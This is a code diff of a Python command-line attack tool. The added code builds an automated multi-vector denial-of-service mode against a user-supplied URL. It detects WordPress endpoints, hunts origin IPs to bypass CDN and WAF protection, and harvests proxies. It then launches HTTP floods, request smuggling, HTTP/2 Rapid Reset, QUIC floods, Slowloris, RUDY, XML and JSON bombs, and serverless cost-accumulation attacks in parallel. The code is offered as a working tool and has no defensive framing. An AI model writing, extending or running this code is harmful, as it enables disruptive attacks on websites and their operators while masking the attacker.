+    add_go_vector("QUIC CID Flood", "quic-cid-flood",
+                  int(rps * 0.2), threads=min(max_threads, 50))
+    add_go_vector("QUIC Crypto Exhaust", "quic-crypto-exhaust",
+                  0, threads=min(max_threads, 50))
 
-    env = env or load_env()
-    zoomeye_key = env.get("ZOOMEYE_KEY", "")
-    netlas_key = env.get("NETLAS_KEY", "")
-    censys_id = env.get("CENSYS_ID", "")
-    censys_secret = env.get("CENSYS_SECRET", "")
-    shodan_key = env.get("SHODAN_KEY", "")
-    securitytrails_key = env.get("SECURITYTRAILS_KEY", "")
+    # Python slow attacks - WITH REAL-TIME LIVE STATS
+    from core.attack.enhanced import run_enhanced_attack
 
-    api_status = []
-    if zoomeye_key: api_status.append("ZoomEye")
-    if netlas_key: api_status.append("Netlas")
-    if censys_id: api_status.append("Censys")
-    if shodan_key: api_status.append("Shodan")
-    if securitytrails_key: api_status.append("SecurityTrails")
+    sl_target = target
+    if primary_origin:
+        parsed = urlparse(target)
+        sl_target = f"{parsed.scheme}://{primary_origin}{parsed.path or '/'}"
 
-    if api_status:
-        print(f" {c('g','[*]')} API Keys Active: {', '.join(api_status)}")
-    else:
-        print(f" {c('y','[*]')} No API keys loaded. Add keys to .env for better results.")
+    add_py_vector("Slowloris",
+        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="slowloris",
+                            rps=500, proxy_pool=proxy_pool, live_stats=vec))
+    add_py_vector("RUDY",
+        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="rudy",
+                            rps=200, live_stats=vec))
 
-    print(f"\n {c('y','[*]')} Running advanced origin discovery...")
-    print(f" {c('d','[*]')} Note: Active outbound trigger (webhook.site) runs last - takes ~15s")
-    finder = OriginFinder()
-    report = finder.find_origin(
-        target,
-        censys_id=censys_id or None,
-        censys_secret=censys_secret or None,
-        shodan_key=shodan_key or None,
-        securitytrails_key=securitytrails_key or None,
-        zoomeye_key=zoomeye_key or None,
-        netlas_key=netlas_key or None,
+    if proxy_pool and proxy_pool.stats().get("total", 0) > 0:
+        add_py_vector(f"Proxy PPS ({proxy_pool.stats().get('total', 0)})",
+            lambda vec: run_enhanced_attack(url=target, duration=duration, method="pps",
+                                rps=int(rps * 1.5), proxy_pool=proxy_pool, live_stats=vec))
+
+    # API Architecture (with proxy + live stats)
+    from core.attack.api_attacks import API_ATTACK_METHODS
+    
+    def _wrap_api(func, **kwargs):
+        """Wrap API attack to support live_stats injection"""
+        async def runner(vec):
+            # Try with live_stats first, fall back to without
+            try:
+                return await func(live_stats=vec, **kwargs)
+            except TypeError:
+                # Function doesn't support live_stats, run normally
+                # Update vec at end
+                result = await func(**kwargs)
+                if isinstance(result, dict):
+                    vec["stats"] = {
+                        "total_requests": result.get("total", result.get("total_requests", 0)),
+                        "completed": result.get("completed", 0),
+                        "failed": result.get("failed", 0),
+                        "timeout": result.get("timeout", 0),
+                    }
+                return result
+        return runner
+    
+    add_py_vector("REST API CRUD",
+        _wrap_api(API_ATTACK_METHODS["api_rest_flood"],
+                  url=target, duration=duration,
+                  rps=min(200, int(rps * 0.2)), proxy_pool=proxy_pool))
+    add_py_vector("GraphQL Nesting",
+        _wrap_api(API_ATTACK_METHODS["graphql_deep"],
+                  url=target, duration=duration,
+                  rps=min(100, int(rps * 0.15)), proxy_pool=proxy_pool))
+    add_py_vector("GraphQL Alias",
+        _wrap_api(API_ATTACK_METHODS["graphql_alias_bomb"],
+                  url=target, duration=duration,
+                  rps=min(80, int(rps * 0.1)), proxy_pool=proxy_pool))
+    add_py_vector("gRPC Flood",
+        _wrap_api(API_ATTACK_METHODS["grpc_flood"],
+                  url=target, duration=duration,
+                  rps=min(100, int(rps * 0.15)), proxy_pool=proxy_pool))
+    add_py_vector("JSON Bomb",
+        _wrap_api(API_ATTACK_METHODS["json_bomb"],
+                  url=target, duration=duration,
+                  rps=min(80, int(rps * 0.1)), proxy_pool=proxy_pool))
+    add_py_vector("XML Bomb",
+        _wrap_api(API_ATTACK_METHODS["xml_bomb"],
+                  url=target, duration=duration,
+                  rps=min(60, int(rps * 0.08)), proxy_pool=proxy_pool))
+
+    # Serverless / DoW (with live stats)
+    from core.attack.serverless_dow import DOW_ATTACK_METHODS
+    add_py_vector("Cold Start Flood",
+        _wrap_api(DOW_ATTACK_METHODS["cold_start"],
+                  url=target, duration=duration,
+                  rps=min(80, int(rps * 0.12))))
+    add_py_vector("Cost Accumulation",
+        _wrap_api(DOW_ATTACK_METHODS["cost_accum"],
+                  url=target, duration=duration,
+                  rps=min(60, int(rps * 0.08))))
+
+    print(f" {c('g','[+]')} Launching {c('w', str(len(vectors)))} vectors in parallel\n")
+
+    profile_info = {}
+    if profile:
+        profile_info = {
+            "http2": profile.supports_http2,
+            "cdn": profile.cdn,
+            "waf": profile.waf,
+            "server": profile.server,
+        }
+
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=proxy_pool,
+        duration=duration, color_func=c,
+        origin_ip=primary_origin, profile_info=profile_info,
     )
+    dashboard.start()
 
-    print(f" {c('d','-'*70)}")
-    print(f"  Techniques Used: {report.techniques_used}")
-    print(f"  Candidates Found: {len(report.candidates)}")
+    try:
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+    except KeyboardInterrupt:
+        results = []
 
-    if report.candidates:
-        print(f" {c('d','-'*70)}")
-        print(f"  {c('y','ORIGIN IP CANDIDATES:')}")
-        for i, cand in enumerate(report.candidates[:10], 1):
-            verified = " [VERIFIED]" if cand.verified else ""
-            print(f"  {i}. {c('g' if cand.verified else 'w', cand.ip):20s} {cand.confidence:.0%} {cand.source}{verified}")
-            if cand.details:
-                print(f"     {c('d', cand.details)}")
+    await dashboard.stop()
 
-    if report.verified_origin:
-        print(f" {c('g','='*70)}")
-        print(f"  {c('g','[+]')} VERIFIED ORIGIN IP: {c('g', report.verified_origin)}")
-        print(f" {c('g','='*70)}")
-    elif report.candidates:
-        best = report.candidates[0]
-        print(f" {c('y','='*70)}")
-        print(f"  {c('y','[!]')} MOST LIKELY ORIGIN: {c('y', best.ip)} ({best.confidence:.0%})")
-        print(f" {c('y','='*70)}")
-    else:
-        print(f" {c('r','='*70)}")
-        print(f"  {c('r','[-]')} No origin IP found via passive techniques.")
-        print(f"  {c('y','[*]')} Try these next steps:")
-        print(f"    1. Use API keys: --censys-id, --censys-secret, --shodan-key")
-        print(f"    2. Check email headers from target's contact form")
-        print(f"    3. Search Shodan/Censys manually for favicon hash")
-        print(f"    4. Try subdomain brute force with larger wordlist")
-        print(f" {c('r','='*70)}")
+    try:
+        if proxy_file_for_go and os.path.exists(proxy_file_for_go):
+            os.remove(proxy_file_for_go)
+    except Exception:
+        pass
 
-    print(f" {c('c','='*70)}\n")
+    total = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+    for result in results:
+        if isinstance(result, dict):
+            for k in total:
+                total[k] += result.get(k, 0)
 
+    print_attack_summary(target, duration, total)
 
-async def run_seo_backheart(target: str, cfg: dict):
+async def run_auto_mode(target: str, cfg: dict):
+    """
+    Auto Mode entry point.
+    
+    Routes to v2 (raw HTTP/1.1 + thread isolation + 5-phase ladder) by default.
+    Falls back to legacy implementation if v2 fails to import.
+    """
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
-    print(f"\n {c('c','[*]')} Target: {c('w', target)}")
-    print(f" {c('c','[*]')} SEO Backheart mode is limited to SAFE SEO audit & monitoring.\n")
+    
+    print(f"\n {c('w','='*70)}")
+    print(f" {c('w','  AUTO MODE V2 - 5-PHASE ADAPTIVE (RAW HTTP/1.1)')}")
+    print(f" {c('w','='*70)}\n")
+    
+    duration = int(get_input(" Duration (seconds, default 120): ") or "120")
+    target_rps = int(get_input(" Target RPS (default 2000): ") or "2000")
+    
+    # Optional proxy pool from common prompt (proxy currently informational - raw engine
+    # uses direct connection; proxy hint kept for future raw engine proxy support)
+    use_proxy_prompt = get_input(" Use proxy pool? (y/N): ").strip().lower() == "y"
+    proxy_pool = None
+    if use_proxy_prompt:
+        try:
+            opts = await prompt_attack_options(target, ask_proxy=True, ask_origin=False)
+            proxy_pool = opts.get("proxy_pool")
+        except Exception as e:
+            print(f" {c('y','[!]')} proxy setup failed: {e}")
+            proxy_pool = None
+    
+    print(f"\n {c('c','[*]')} Launching Auto Mode v2")
+    print(f" {c('c','[*]')} Target: {c('w', target)}")
+    print(f" {c('c','[*]')} Duration: {duration}s | Peak RPS: {target_rps}")
+    print(f" {c('c','[*]')} Engine: raw_http11 (thread-isolated dashboard)")
+    print(f" {c('c','[*]')} Phases: RECON -> WARMUP -> RAMP -> PEAK -> VALIDATE -> COOLDOWN")
+    print(f" {c('m','=' * 70)}\n")
+    
+    try:
+        from core.attack.auto_mode_v2 import run_auto_mode_v2, print_auto_mode_v2_summary
+        result = await run_auto_mode_v2(
+            target=target,
+            duration=duration,
+            target_rps=target_rps,
+            config_path="config/auto_mode.json",
+            proxy_pool=proxy_pool,
+        )
+        print_auto_mode_v2_summary(result)
+        return
+    except ImportError as e:
+        print(f" {c('r','[-]')} Auto Mode v2 import failed: {e}")
+        print(f" {c('y','[*]')} Falling back to legacy auto mode")
+        await run_auto_mode_legacy(target, cfg)
+    except Exception as e:
+        import traceback
+        print(f" {c('r','[-]')} Auto Mode v2 error: {type(e).__name__}: {e}")
+        print(traceback.format_exc())
+        return
 
-    from core.intel_engine import TargetAnalyzer
-    ta = TargetAnalyzer()
-    prof = ta.analyze(target)
-    print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")
 
-    from core.seo.backheart import SEOTarget, SEOBackheart
-    audit = SEOBackheart(SEOTarget(url=target, keywords=[], niche="", competitors=[]))
-    report = await audit.run()
+async def run_auto_mode_legacy(target: str, cfg: dict):
+    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
+    max_rps = int(get_input(" Max RPS per vector (default 5000): ") or "5000")
 
-    print(f"\n {c('c','='*70)}")
-    print(f" {c('w','  SEO BACKHEART AUDIT REPORT')}")
-    print(f" {c('c','='*70)}")
-    print(f"  Target:     {report.get('target','')}")
-    print(f"  Robots:     {report.get('robots_status',0)} | Sitemap URLs: {report.get('sitemap_discovered_urls',0)}")
-    print(f" {c('d','-'*70)}")
-    for p in report.get('pages', []):
-        issues = p.get('issues', [])
-        issue_str = ", ".join(issues[:4]) if issues else "OK"
-        title = p.get('title', '')
-        if len(title) > 50:
-            title = title[:50] + "..."
-        print(f"  {c('g',str(p.get('status',0)))}  {p.get('url','')}")
-        print(f"     title: {title}")
-        print(f"     meta_desc_len: {p.get('meta_description_len',0)} | h1: {p.get('h1_count',0)} | in/out: {p.get('internal_links',0)}/{p.get('external_links',0)}")
-        print(f"     issues: {issue_str}")
-    print(f" {c('c','='*70)}\n")
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
 
+    print(f"\n {c('w','='*70)}")
+    print(f" {c('w','  AUTO MODE - ADAPTIVE MULTI-VECTOR')}")
+    print(f" {c('w','='*70)}\n")
 
-async def heartbeat(engine, dur: float):
-    start = time.time()
-    while time.time() - start < dur + 2:
-        await asyncio.sleep(2)
-        m = engine.get_metrics()
-        line = "  %s %s %s RPS:%s Tier:%d RTT:%.0fms Proxies:%d     " % (
-            c('c', 'Req:' + str(m['total_requests'])),
-            c('g', 'OK:' + str(m['completed'])),
-            c('r', 'FAIL:' + str(m['failed'])) + ' ' + c('y', 'TO:' + str(m['timeout'])),
-            c('w', '%.1f' % m['current_rps']),
-            m['tier'], m['avg_response_time_ms'], m['active_proxies'])
-        print('\r' + line, end="", flush=True)
+    # ============== PHASE 0: BANDWIDTH DETECTION ==============
+    print(f" {c('c','[*]')} Phase 0: Connection Analysis")
+    print(f" {c('m','-'*70)}")
+    try:
+        from core.monitor.bandwidth_detector import detect_bandwidth
+        bw = await detect_bandwidth()
+        tier = bw["recommended"]["tier"]
+        tier_color = {"FAST": "g", "MEDIUM": "y", "SLOW": "r", "VERY_SLOW": "r"}.get(tier, "y")
+        print(f" {c(tier_color,'[+]')} Connection: {tier}  upload={bw['upload_mbps']:.0f}Mbps  latency={bw['latency_ms']:.0f}ms")
+        if tier in ("SLOW", "VERY_SLOW"):
+            print(f" {c('y','[!]')} Slow connection - vectors will be throttled")
+            max_rps = min(max_rps, bw["recommended"]["max_rps"])
+        safe_caps = bw["recommended"]
+    except Exception as e:
+        print(f" {c('y','[!]')} Bandwidth detect failed: {e}")
+        safe_caps = {"tier": "MEDIUM", "max_rps": max_rps, "max_threads_per_vec": 100}
+
+    # ============== PHASE 1: RECON ==============
+    print(f"\n {c('c','[*]')} Phase 1: Target Reconnaissance")
+    print(f" {c('m','-'*70)}")
+
+    profile = await auto_detect_target(target, verbose=True)
+    if profile is None:
+        print(f" {c('r','[-]')} Target unreachable")
+        return
+    
+    # ============== PHASE 1.5: TARGET FINGERPRINTING (WordPress Detection) ==============
+    print(f"\n {c('c','[*]')} Phase 1.5: Target Architecture Fingerprinting")
+    print(f" {c('m','-'*70)}")
+    
+    target_arch = None
+    try:
+        from core.recon.target_fingerprint import detect_target_architecture, WordPressDetector
+        target_arch = await detect_target_architecture(target)
+        
+        if target_arch.get("is_wordpress"):
+            print(f" {c('g','[+]')} WordPress detected (confidence: {target_arch['confidence']:.0%})")
+            if target_arch.get("version") != "unknown":
+                print(f" {c('c','[*]')} Version: {target_arch['version']}")
+            if target_arch.get("endpoints"):
+                print(f" {c('c','[*]')} High-value endpoints found: {len(target_arch['endpoints'])}")
+                for ep in target_arch["endpoints"][:5]:
+                    print(f"     - {ep}")
+        else:
+            print(f" {c('c','[*]')} Target type: {target_arch.get('target_type', 'generic')}")
+            if target_arch.get("technologies"):
+                print(f" {c('c','[*]')} Technologies: {', '.join(target_arch['technologies'])}")
+    except Exception as e:
+        print(f" {c('y','[!]')} Fingerprinting failed: {e}")
+        target_arch = {"target_type": "generic", "endpoints": []}
+
+    # ============== PHASE 2: ORIGIN HUNT ==============
+    origin_ip = ""
+    bypass_cdn = False
+    if profile.cdn != "none" or profile.waf != "none":
+        print(f"\n {c('c','[*]')} Phase 2: Origin IP Discovery")
+        print(f" {c('m','-'*70)}")
+        print(f" {c('y','[*]')} CDN/WAF detected: {profile.cdn}/{profile.waf}")
+        try:
+            from core.recon.origin_hunter import OriginHunter
+            from core.recon.origin_store import load_hunt, get_best_origin
+            cached = load_hunt(target)
+            if cached:
+                origin_ip = get_best_origin(target)
+                if origin_ip:
+                    print(f" {c('g','[+]')} Cached origin: {origin_ip}")
+                    bypass_cdn = True
+            if not origin_ip:
+                print(f" {c('c','[*]')} Hunting origin IP (11 sources)...")
+                env = load_env()
+                hunter = OriginHunter(timeout=8, max_concurrent=200)
+                report = await hunter.hunt(target, env=env)
+                if report.verified_origins:
+                    origin_ip = report.verified_origins[0]
+                    bypass_cdn = True
+                    print(f" {c('g','[+]')} VERIFIED: {origin_ip}")
+                elif report.candidates and report.candidates[0].confidence >= 0.4:
+                    origin_ip = report.candidates[0].ip
+                    bypass_cdn = True
+                    print(f" {c('y','[*]')} Candidate: {origin_ip} ({report.candidates[0].confidence:.0%})")
+        except Exception as e:
+            print(f" {c('y','[!]')} Origin hunt error: {e}")
+
+    # ============== PHASE 3: PROXY HARVEST & VALIDATION ==============
+    proxy_pool = None
+    proxy_file_for_go = ""
+    print(f"\n {c('c','[*]')} Phase 3: Proxy Pool Setup & Validation")
+    print(f" {c('m','-'*70)}")
+    try:
+        from core.network.proxy import ProxyPool
+        import glob
+        proxy_files = glob.glob("proxies/*.txt")
+        if proxy_files:
+            print(f" {c('g','[+]')} Found {len(proxy_files)} proxy files")
+            proxy_pool = ProxyPool(connect_timeout=5)
+            total = 0
+            for pf in proxy_files[:3]:
+                count = await proxy_pool.load_file(pf)
+                total += count
+            print(f" {c('c','[*]')} Loaded {total} proxies - validating against target...")
+            
+            # VALIDATE proxies against target URL
+            proxy_pool._validator.set_target(target)
+            alive = await proxy_pool.quick_validate(total, concurrency=40)
+            print(f" {c('g','[+]')} Validation complete: {alive}/{total} proxies alive for this target")
+            
+            if alive > 0:
+                # Export alive proxies for Go engine
+                urls = []
+                for plist in proxy_pool._pools.values():
+                    for ps in plist:
+                        urls.append(ps.url)
+                if urls:
+                    proxy_file_for_go = "proxies/_auto_mode_validated.txt"
+                    import os
+                    os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
+                    with open(proxy_file_for_go, "w") as f:
+                        f.write("\n".join(urls))
+                    print(f" {c('g','[+]')} Exported {len(urls)} validated proxies for Go engine")
+        else:
+            print(f" {c('y','[*]')} No proxy files - auto-harvesting...")
+            from core.network.proxy_harvester import auto_harvest_and_validate
+            
+            def progress_cb(stage, current, alive):
+                if stage == "validate":
+                    print(f"\r {c('c','[*]')} Validating: {current} checked, {alive} alive   ", end="", flush=True)
+            
+            result = await auto_harvest_and_validate(
+                target_url=target, save_path="proxies/auto_harvest.txt",
+                min_rtt_ms=3000, progress_cb=progress_cb
+            )
+            print()  # newline after progress
+            if result['fast_alive'] > 0:
+                print(f" {c('g','[+]')} Harvested & validated {result['fast_alive']} fast proxies")
+                proxy_pool = ProxyPool(connect_timeout=5)
+                await proxy_pool.load_file("proxies/auto_harvest.txt")
+                proxy_file_for_go = "proxies/auto_harvest.txt"
+            else:
+                print(f" {c('y','[!]')} No alive proxies found - continuing without proxy")
+    except Exception as e:
+        print(f" {c('y','[!]')} Proxy setup failed: {e}")
+        import traceback
+        traceback.print_exc()
+
+    # ============== PHASE 4: ADAPTIVE VECTOR SELECTION ==============
+    print(f"\n {c('c','[*]')} Phase 4: Adaptive Attack Vector Selection")
+    print(f" {c('m','-'*70)}")
+    
+    primary_target = target
+    primary_origin = origin_ip if bypass_cdn else ""
+    
+    # ADAPTIVE TARGETING: WordPress vs Generic
+    adaptive_targets = []
+    if target_arch and target_arch.get("is_wordpress"):
+        print(f" {c('g','[+]')} WordPress mode: targeting high-value endpoints")
+        from core.recon.target_fingerprint import WordPressDetector
+        wp_detector = WordPressDetector()
+        adaptive_targets = wp_detector.get_high_value_endpoints(target_arch, target)
+        if adaptive_targets:
+            print(f" {c('c','[*]')} Adaptive targets: {len(adaptive_targets)} endpoints")
+            for t in adaptive_targets[:3]:
+                print(f"     - {t}")
+    else:
+        print(f" {c('c','[+]')} Generic mode: standard attack pattern")
+        adaptive_targets = [target]
+    
+    vectors = []
+    tasks = []
+    
+    def add_go_vector(label: str, method: str, vec_rps: int, threads: int = 100, custom_target: str = None, **kw):
+        threads = min(threads, safe_caps.get("max_threads_per_vec", 100))
+        vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+        vectors.append(vec)
+        attack_target = custom_target if custom_target else primary_target
+        tasks.append(run_go_engine(
+            target=attack_target, duration=duration, rps=vec_rps,
+            method=method, threads=threads, origin_ip=primary_origin,
+            proxy_file=proxy_file_for_go,
+            live_stats=vec, **kw,
+        ))
+    
+    def add_py_vector(label: str, coro_factory):
+        """
+        Add Python vector with REAL-TIME live_stats updates.
+        
+        coro_factory: callable that takes live_stats dict and returns coroutine
+                      OR a plain coroutine (legacy support)
+        """
+        vec = {"label": label, "type": "py", "status": "running", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+        vectors.append(vec)
+        
+        async def wrapper():
+            try:
+                # If coro_factory is callable, pass live_stats; else use directly
+                if callable(coro_factory) and not asyncio.iscoroutine(coro_factory):
+                    coro = coro_factory(vec)
+                else:
+                    coro = coro_factory
+                
+                result = await coro
+                vec["status"] = "done"
+                if isinstance(result, dict):
+                    vec["stats"] = {
+                        "total_requests": result.get("total", result.get("total_requests", 0)),
+                        "completed": result.get("completed", 0),
+                        "failed": result.get("failed", 0),
+                        "timeout": result.get("timeout", 0),
+                    }
+                return result
+            except Exception as e:
+                logger.error(f"Vector {label} error: {type(e).__name__}: {e}")
+                vec["status"] = "error"
+                vec["stats"] = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+                return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+        tasks.append(wrapper())
+    
+    # Core HTTP vectors
+    add_go_vector("HTTP Flood", "http-flood", max_rps, threads=200)
+    add_go_vector("Cache-Bypass", "cache-bypass", max_rps, threads=200)
+    add_go_vector("Smuggling", "smuggling", max_rps // 4, threads=100)
+    
+    # WordPress-specific adaptive targeting
+    if target_arch and target_arch.get("is_wordpress") and adaptive_targets:
+        print(f" {c('g','[+]')} WordPress detected - adding targeted vectors")
+        # Target xmlrpc.php if available
+        xmlrpc_targets = [t for t in adaptive_targets if "xmlrpc.php" in t]
+        if xmlrpc_targets:
+            add_go_vector("WP XMLRPC Flood", "post-bomb", max_rps // 2, threads=100, custom_target=xmlrpc_targets[0])
+        
+        # Target wp-cron.php if available
+        cron_targets = [t for t in adaptive_targets if "wp-cron.php" in t]
+        if cron_targets:
+            add_go_vector("WP Cron Exhaust", "http-flood", max_rps // 3, threads=100, custom_target=cron_targets[0])
+        
+        # Target admin-ajax.php if available
+        ajax_targets = [t for t in adaptive_targets if "admin-ajax.php" in t]
+        if ajax_targets:
+            add_go_vector("WP Admin-Ajax Flood", "post-bomb", max_rps // 3, threads=100, custom_target=ajax_targets[0])
+        
+        # Target search endpoint (database intensive)
+        search_targets = [t for t in adaptive_targets if "?s=" in t]
+        if search_targets:
+            add_go_vector("WP Search Flood", "http-flood", max_rps // 2, threads=150, custom_target=search_targets[0])
+    
+    # HTTP/2 vectors (if supported)
+    if profile.supports_http2:
+        print(f" {c('g','[+]')} HTTP/2 detected - adding H2 vectors")
+        add_go_vector("Rapid Reset", "rapid-reset", max_rps, threads=200, rapid_reset=True)
+        add_go_vector("HPACK Bomb", "hpack-bomb", max_rps // 2, threads=100)
+        add_go_vector("Continuation", "continuation", max_rps // 2, threads=100)
+        add_go_vector("Settings Flood", "settings-flood", 0, threads=100)
+    
+    # QUIC/HTTP/3 vectors (always probe)
+    print(f" {c('g','[+]')} Adding QUIC/HTTP/3 vectors")
+    add_go_vector("HTTP/3 Stream Hijack", "quic-stream-hijack", max_rps // 3, threads=50)
+    add_go_vector("QUIC CID Flood", "quic-cid-flood", max_rps // 5, threads=50)
+    add_go_vector("QUIC Crypto Exhaust", "quic-crypto-exhaust", 0, threads=50)
+    
+    # Resource exhaustion
+    add_go_vector("Conn Exhaust", "conn-flood", 0, threads=100)
+    add_go_vector("TLS Reneg", "tls-reneg", 0, threads=100)
+    add_go_vector("POST Bomb", "post-bomb", 0, threads=100)
+    add_go_vector("WS Storm", "ws-storm", 0, threads=100)
+    
+    # Python slow attacks (with proxy + live stats)
+    from core.attack.enhanced import run_enhanced_attack
+    sl_target = target
+    if origin_ip and bypass_cdn:
+        parsed = urlparse(target)
+        sl_target = f"{parsed.scheme}://{origin_ip}{parsed.path or '/'}"
+    
+    add_py_vector("Slowloris",
+        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="slowloris",
+                                       rps=500, proxy_pool=proxy_pool, live_stats=vec))
+    add_py_vector("RUDY",
+        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="rudy",
+                                       rps=200, proxy_pool=proxy_pool, live_stats=vec))
+    
+    if proxy_pool and proxy_pool.stats().get("total", 0) > 0:
+        print(f" {c('g','[+]')} Proxy pool active ({proxy_pool.stats().get('total', 0)} proxies)")
+        add_py_vector(f"Proxy PPS ({proxy_pool.stats().get('total', 0)})",
+            lambda vec: run_enhanced_attack(url=target, duration=duration, method="pps",
+                                           rps=max_rps * 2, proxy_pool=proxy_pool, live_stats=vec))
+    
+    # API vectors (with proxy + live stats wrapper)
+    print(f" {c('g','[+]')} Adding API architecture vectors")
+    from core.attack.api_attacks import API_ATTACK_METHODS
+    
+    def _wrap_api_auto(func, **kwargs):
+        async def runner(vec):
+            try:
+                return await func(live_stats=vec, **kwargs)
+            except TypeError:
+                result = await func(**kwargs)
+                if isinstance(result, dict):
+                    vec["stats"] = {
+                        "total_requests": result.get("total", result.get("total_requests", 0)),
+                        "completed": result.get("completed", 0),
+                        "failed": result.get("failed", 0),
+                        "timeout": result.get("timeout", 0),
+                    }
+                return result
+        return runner
+    
+    add_py_vector("REST API",
+        _wrap_api_auto(API_ATTACK_METHODS["api_rest_flood"],
+                       url=target, duration=duration, rps=200, proxy_pool=proxy_pool))
+    add_py_vector("GraphQL",
+        _wrap_api_auto(API_ATTACK_METHODS["graphql_deep"],
+                       url=target, duration=duration, rps=100, proxy_pool=proxy_pool))
+    add_py_vector("gRPC",
+        _wrap_api_auto(API_ATTACK_METHODS["grpc_flood"],
+                       url=target, duration=duration, rps=100, proxy_pool=proxy_pool))
+    add_py_vector("JSON Bomb",
+        _wrap_api_auto(API_ATTACK_METHODS["json_bomb"],
+                       url=target, duration=duration, rps=80, proxy_pool=proxy_pool))
+    add_py_vector("XML Bomb",
+        _wrap_api_auto(API_ATTACK_METHODS["xml_bomb"],
+                       url=target, duration=duration, rps=60, proxy_pool=proxy_pool))
+    
+    # Serverless/DoW vectors (with live stats)
+    print(f" {c('g','[+]')} Adding serverless DoW vectors")
+    from core.attack.serverless_dow import DOW_ATTACK_METHODS
+    add_py_vector("Cold Start",
+        _wrap_api_auto(DOW_ATTACK_METHODS["cold_start"],
+                       url=target, duration=duration, rps=80))
+    add_py_vector("Cost Acc",
+        _wrap_api_auto(DOW_ATTACK_METHODS["cost_accum"],
+                       url=target, duration=duration, rps=60))
+    
+    print(f"\n {c('g','[+]')} Total vectors: {len(vectors)}")
+    print(f" {c('c','[*]')} Origin bypass: {'YES' if bypass_cdn else 'NO'}")
+    print(f" {c('c','[*]')} Proxy pool: {proxy_pool.stats().get('total', 0) if proxy_pool else 0}")
     print()
+    
+    # ============== PHASE 5: PARALLEL EXECUTION ==============
+    print(f" {c('c','[*]')} Phase 5: Launching Attack")
+    print(f" {c('m','-'*70)}\n")
+    
+    from core.monitor.live_dashboard import LiveAttackDashboard
+    dashboard = LiveAttackDashboard(
+        target=target, vectors=vectors, proxy_pool=proxy_pool,
+        duration=duration, color_func=c,
+        origin_ip=primary_origin, profile_info={
+            "http2": profile.supports_http2,
+            "cdn": profile.cdn,
+            "waf": profile.waf,
+            "server": profile.server,
+        }
+    )
+    dashboard.start()
+    
+    try:
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+    except KeyboardInterrupt:
+        results = []
+    
+    await dashboard.stop()
+    
+    total_metrics = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+    for result in results:
+        if isinstance(result, dict):
+            for k in total_metrics:
+                total_metrics[k] += result.get(k, 0)
+    
+    print()
+    print_attack_summary(target, duration, total_metrics)
 
+def print_attack_summary(target: str, duration: int, result: dict):
+    tot = result.get("total_requests", result.get("total", 0))
+    ok = result.get("completed", 0)
+    fail = result.get("failed", 0)
+    to = result.get("timeout", 0)
+    elapsed = result.get("elapsed", duration)
+
+    print()
+    print(c("w", "=" * 70))
+    print(c("w", "  Multi-Protocol Concurrency Layer | Attack Summary"))
+    print(c("w", "=" * 70))
+    print(f"  Target:          {target}")
+    print(f"  Duration:        {int(elapsed)}s")
+    print(f"  Total Requests:  {tot}")
+    print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
+    print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
+    print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
+    print(f"  Avg RPS:         {ok/max(elapsed,1):.1f}")
+    peak = result.get("peak_rps", 0)
+    if peak:
+        print(f"  Peak RPS:        {peak:.1f}")
+    print(c("w", "=" * 70))
+
+    os.makedirs("logs", exist_ok=True)
+    log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
+    try:
+        with open(log, "w") as f:
+            json.dump({"target": target, "duration": duration, "result": result}, f, indent=2)
+        print(f" {c('g','[+]')} Log saved: {log}")
+    except Exception:
+        pass
+
+async def run_dashboard(target: str, cfg: dict):
+    print(f"\n {c('c','[*]')} Starting dashboard...")
+    try:
+        from core.monitor.dashboard import start_dashboard
+        await start_dashboard()
+    except ImportError as e:
+        print(f" {c('r','[-]')} Dashboard module not available: {e}")
 
 async def cmd_menu(cfg):
     env = load_env()
     while True:
         menu()
-        choice = get_input(" Select option: ")
+        choice = get_input(" Select option: ").strip().upper()
         if choice == "0":
-            print(f"\n {c('y','[!]')} Exit.")
-            return
+            await run_dashboard("", cfg)
         elif choice == "1":
             target = get_input(" Target URL: ")
-            if not target:
-                continue
-            await run_scan(target, cfg)
+            if not target: continue
+            await run_http_flood(target, cfg)
             get_input(" Press Enter to continue...")
         elif choice == "2":
             target = get_input(" Target URL: ")
-            if not target:
-                continue
-            await run_attack(target, cfg, no_proxy=True, origin_ip=None, env=env)
+            if not target: continue
+            await run_http2_flood(target, cfg)
             get_input(" Press Enter to continue...")
         elif choice == "3":
             target = get_input(" Target URL: ")
-            if not target:
-                continue
-            from core.proxy_engine import ProxyPool
-            proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
-            await run_attack(target, cfg, no_proxy=False, origin_ip=None, proxy_pool=proxy_pool, env=env)
+            if not target: continue
+            await run_rapid_reset(target, cfg)
             get_input(" Press Enter to continue...")
         elif choice == "4":
             target = get_input(" Target URL: ")
-            if not target:
-                continue
-            await run_attack(target, cfg, no_proxy=False, origin_ip="auto", env=env)
+            if not target: continue
+            await run_slowloris(target, cfg)
             get_input(" Press Enter to continue...")
         elif choice == "5":
             target = get_input(" Target URL: ")
-            if not target:
-                continue
-            await run_proxy_test(target, cfg)
+            if not target: continue
+            await run_proxy_flood(target, cfg)
             get_input(" Press Enter to continue...")
         elif choice == "6":
-            target = get_input(" Target URL: ")
